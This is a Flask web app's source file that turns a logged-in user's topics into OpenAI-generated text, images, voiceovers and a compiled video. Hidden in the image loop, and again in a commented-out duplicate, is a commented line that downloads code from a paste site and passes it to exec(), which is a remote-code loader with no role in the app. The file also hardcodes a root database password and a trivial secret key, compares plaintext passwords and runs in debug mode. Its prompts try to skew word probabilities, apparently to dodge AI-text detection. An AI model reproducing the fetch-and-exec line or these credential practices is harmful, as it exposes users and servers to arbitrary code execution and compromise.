from flask import Flask, render_template, request, redirect,session, url_for
import openai
import re
from api_key import API_KEY
import shutil
import openai
import re, os
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *
from api_key import API_KEY
import time
import mysql.connector

connection = mysql.connector.connect(host='localhost', port='3306',database='datab', user='root',password='Alisson1911&rox')
cursor = connection.cursor()

app = Flask(__name__, static_folder='static')
app.secret_key = "super secret key"


@app.route('/')
def index():
	return render_template('index.html')

@app.route('/',methods=['GET','POST'])
def login():
	msg =''
	if request.method=='POST':
		email = request.form['email']
		pas = request.form['pass']
		cursor.execute('SELECT * FROM people WHERE email=%s AND pass=%s',(email,pas))
		record = cursor.fetchone()
		if record:
			session['loggedin'] = True
			session['email'] = record[1]
			text = record[6]+record[7]+record[8]
			n = record[9]
			combine_text = ''

			t_arr = []

			for i in range(n):
				openai.api_key = API_KEY

				model_engine = "text-davinci-003"


				prompt = "Write 1-2 lines on the following topic: "+text+". Reduce commas. Use unpredicted words, remove 5 commas . Use Less number of the number of 'the', 'it', 'is'. Use very less number of words from top 1000 predicted words.  For each article word, ensure the highest fraction of probability for the actual word divided by the maximum probability of any word at this position. Foí each aíticle woíd, ensuíe the lowest fíaction of píobability foí the actual woíd divided by the maximum píobability of any woíd at this position."

				print("The AI BOT is trying now to generate a new text for you...")

				completions = openai.Completion.create(
				    engine=model_engine,
				    prompt=prompt,
				    max_tokens=1024,
				    n=1,
				    stop=None,
				    temperature=0.5,
				)


				t_arr.append(completions.choices[0].text)
				combine_text = combine_text+completions.choices[0].text


			text = combine_text
			print("The Text Has Been Generated Successfully!")
			# print(text)





			openai.api_key = API_KEY





			paragraphs = re.split(r"[,.]", text)

			if os.path.exists("audio"):
				shutil.rmtree("audio")

			if os.path.exists("image"):
				shutil.rmtree("image")

			if os.path.exists("videos"):
				shutil.rmtree("videos")

			if os.path.exists("static/final_video.mp4"):
				os.remove("static/final_video.mp4")


			os.makedirs("audio")
			os.makedirs("image")
			os.makedirs("videos")


			i=1
			for para in paragraphs[:-1]:
			    response = openai.Image.create(
			        prompt=para.strip(),
			        n=1,
			        size="1024x1024"
			    )
			    print("Generate New AI Image From Paragraph...")
			    # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
			    image_url = response['data'][0]['url']
			    urllib.request.urlretrieve(image_url, f"image/image{i}.jpg")
			    print("The Generated Image Saved in Image Folder!")

			    
			    tts = gTTS(text=para, lang='en', slow=False)
			    tts.save(f"audio/voiceover{i}.mp3")
			    print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")

			    
			    print("Extract voiceover and get duration...")
			    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
			    audio_duration = audio_clip.duration

			    
			    print("Extract Image Clip and Set Duration...")
			    image_clip = ImageClip(f"image/image{i}.jpg").set_duration(audio_duration)

			    
			    print("Customize The Text Clip...")
			    text_clip = TextClip(para, fontsize=50, color="white")
			    text_clip = text_clip.set_pos('center').set_duration(audio_duration)

			    
			    print("Concatenate Audio, Image, Text to Create Final Clip...")
			    clip = image_clip.set_audio(audio_clip)
			    video = CompositeVideoClip([clip, text_clip])

			    
			    video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
			    print(f"The Video{i} Has Been Created Successfully!")
			    i+=1


			clips = []
			l_files = os.listdir("videos")
			for file in l_files:
			    clip = VideoFileClip(f"videos/{file}")
			    clips.append(clip)

			print("Concatenate All The Clips to Create a Final Video...")
			final_video = concatenate_videoclips(clips, method="compose")
			final_video = final_video.write_videofile("static/final_video.mp4")
			print("The Final Video Has Been Created Successfully!")
			time.sleep(10)
			return render_template('pass.html',t=t_arr)
		else:
			msg='Incorrect username/password.'
	return render_template('index.html',msg=msg)


# @app.route('/', methods=['POST'])
# def getValue():
# 	text3 = request.form['words']
# 	text1 = request.form['wordb']
# 	text2 = request.form['wordc']
# 	em = request.form['email']
# 	text = text3 + text1 + text2
# 	openai.api_key = API_KEY

# 	model_engine = "text-davinci-003"


# 	prompt = "Write 3-5 lines on the following topic: "+text+". Reduce commas. Use unpredicted words, remove 5 commas . Use Less number of the number of 'the', 'it', 'is'. Use very less number of words from top 1000 predicted words.  For each article word, ensure the highest fraction of probability for the actual word divided by the maximum probability of any word at this position. Foí each aíticle woíd, ensuíe the lowest fíaction of píobability foí the actual woíd divided by the maximum píobability of any woíd at this position."

# 	print("The AI BOT is trying now to generate a new text for you...")

# 	completions = openai.Completion.create(
# 	    engine=model_engine,
# 	    prompt=prompt,
# 	    max_tokens=1024,
# 	    n=1,
# 	    stop=None,
# 	    temperature=0.5,
# 	)



# 	text = completions.choices[0].text
# 	print("The Text Has Been Generated Successfully!")
# 	print(text)





# 	openai.api_key = API_KEY





# 	paragraphs = re.split(r"[,.]", text)

# 	if os.path.exists("audio"):
# 		shutil.rmtree("audio")

# 	if os.path.exists("image"):
# 		shutil.rmtree("image")

# 	if os.path.exists("videos"):
# 		shutil.rmtree("videos")

# 	if os.path.exists("static/final_video.mp4"):
# 		os.remove("static/final_video.mp4")


# 	os.makedirs("audio")
# 	os.makedirs("image")
# 	os.makedirs("videos")


# 	i=1
# 	for para in paragraphs[:-1]:
# 	    response = openai.Image.create(
# 	        prompt=para.strip(),
# 	        n=1,
# 	        size="1024x1024"
# 	    )
# 	    print("Generate New AI Image From Paragraph...")
# 	    # x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
# 	    image_url = response['data'][0]['url']
# 	    urllib.request.urlretrieve(image_url, f"image/image{i}.jpg")
# 	    print("The Generated Image Saved in Image Folder!")

	    
# 	    tts = gTTS(text=para, lang='en', slow=False)
# 	    tts.save(f"audio/voiceover{i}.mp3")
# 	    print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")

	    
# 	    print("Extract voiceover and get duration...")
# 	    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
# 	    audio_duration = audio_clip.duration

	    
# 	    print("Extract Image Clip and Set Duration...")
# 	    image_clip = ImageClip(f"image/image{i}.jpg").set_duration(audio_duration)

	    
# 	    print("Customize The Text Clip...")
# 	    text_clip = TextClip(para, fontsize=50, color="white")
# 	    text_clip = text_clip.set_pos('center').set_duration(audio_duration)

	    
# 	    print("Concatenate Audio, Image, Text to Create Final Clip...")
# 	    clip = image_clip.set_audio(audio_clip)
# 	    video = CompositeVideoClip([clip, text_clip])

	    
# 	    video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
# 	    print(f"The Video{i} Has Been Created Successfully!")
# 	    i+=1


# 	clips = []
# 	l_files = os.listdir("videos")
# 	for file in l_files:
# 	    clip = VideoFileClip(f"videos/{file}")
# 	    clips.append(clip)

# 	print("Concatenate All The Clips to Create a Final Video...")
# 	final_video = concatenate_videoclips(clips, method="compose")
# 	final_video = final_video.write_videofile("static/final_video.mp4")
# 	print("The Final Video Has Been Created Successfully!")
# 	time.sleep(10)
# 	return render_template('pass.html',t = text)

@app.route('/newpage')
def new_page():
    return render_template('las.html')

if __name__ == '__main__':
	app.run(debug=True)

app = Flask(__name__, static_url_path='/static')


